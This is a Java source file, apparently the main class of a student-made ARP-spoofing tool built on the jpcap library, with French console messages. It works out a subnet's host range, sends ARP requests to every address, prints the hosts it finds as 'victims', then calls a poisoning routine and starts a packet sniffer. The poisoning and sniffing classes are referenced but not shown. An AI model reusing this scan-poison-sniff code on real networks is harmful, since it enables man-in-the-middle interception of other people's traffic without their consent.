import jpcap.JpcapCaptor;
import java.net.Inet4Address;
import java.net.InetAddress;
import java.util.Arrays;
 
import jpcap.*;
import jpcap.packet.*;
import jpcap.NetworkInterface;
import jpcap.packet.Packet;

import java.net.Inet4Address;
import java.net.InetAddress;
import java.util.Arrays;
 
import jpcap.*;
import jpcap.packet.*;
public class mask {
public static String ip_gw;
public static String mac_gw;
public static String mask_ip;
public  static void  calcul_mask(String ch,String ip )
{
int ff=0;
String  mask=ch;

   int  tab_int[]=new int[4];
   int  tab1_int[]=new int[4];
 String tab[]=mask.split("[.]");
String tab1[]=ip.split("[.]");


for(int  i=0;i<4;i++){
tab_int[i]= Integer.parseInt(tab[i]);

}


for(int  i=0;i<4;i++){
tab1_int[i]=Integer.parseInt(tab1[i]);

}
int nb_host=1;
int  tab_in[]={0,128,192,224,240,248,252,254};

for(int i=0;i<4;i++)
{
for(int j=0;j<8;j++)

if(tab_int[i]==tab_in[j])
{
nb_host=nb_host*(256-tab_in[j]);
j=8;

}
}
nb_host=nb_host-2;
System.out.println("le nombre de host  est    "+nb_host);
int cont=0;
int index=0;
int x3=1;
int x2=1;
int x4=0; int t=0;
for(int j=1;j<=nb_host;j++)
{
if(nb_host<=254)
{


tab1_int[3]=j;


}
else if(nb_host<=65534  &&  cont==0 && index <=255)
{
tab1_int[2]=0;
tab1_int[3]=j;

index ++;
}
if(index >255 && index <=65434)
cont=1;
if(nb_host<=65534 &&   cont==1)
{
tab1_int[2]=x3;
tab1_int[3]=x4;

if(x4>255){
x4=0;
x3++;

}

x4++;
}
if(nb_host>65534  )
{
if( index <=255 && cont==0)
{
tab1_int[1]=0;
tab1_int[2]=0;
tab1_int[3]=index+1;
index++;
}
if(index >255 && cont==0)
{
cont=1;
index=0;
}
if(index >255 && cont==1)
{
cont=2;
}
if(cont==1)
{
index++;
tab1_int[1]=0;
tab1_int[2]=x3;
tab1_int[3]=x4;
x4++;
if(x4>255)
{
x4=0;
x3++;
}
}
if(cont==2)
{

tab1_int[1]=x2;
tab1_int[2]=x3;
tab1_int[3]=x4;
x4++;
if(x4>255)
{
x4=0;
x3++;
}
if(x3>255)
{
x3=0;
x2++;
}

}

}

String ip_ch=" ";


byte bite[]=new byte[]{(byte)tab1_int[0],(byte)tab1_int[1],(byte)tab1_int[2],(byte)tab1_int[3]};

try
{

arp_request.arp(InetAddress.getByName("192.168.43.98"),bite);

			
}
catch(Exception  E)
{
System.out.println("ereurrrrrrrrrrr"+E.getMessage());
}



}



}



 public static void main(String[] args) 
{
try{
System.out.println("wait for scaning finished  plz"); 
fichier fich;
//fich=new fichier();
//fich.ip_mac_gw();
//ifconfig.mask();
mac_gw="fe:ff:fe:fe:fe:fe";
System.out.println("l'adres ip de gw et"+ip_gw); 
System.out.println("mac adres de gw est"+mac_gw); 
System.out.println("masque de sous reseau est"+mask_ip); 
calcul_mask("255.255.255.0","192.168.43.1");
System.out.println("le scan est terminer"); 
System.out.println("les adres ip  et adres mac des victimes sont "); 
for(int i=0;i<tab_mac.i_mac;i++)

System.out.println("victimes numero   "+i+"  de adres ip  "+tab_mac.tab_ip[i]+" et mac   "+tab_mac.tab_mac[i]); 
System.out.println("poisonning");

th_arp.poison();
out snif=new out();
snif.king();
}
catch(Exception 	e	)
{
}





































}
}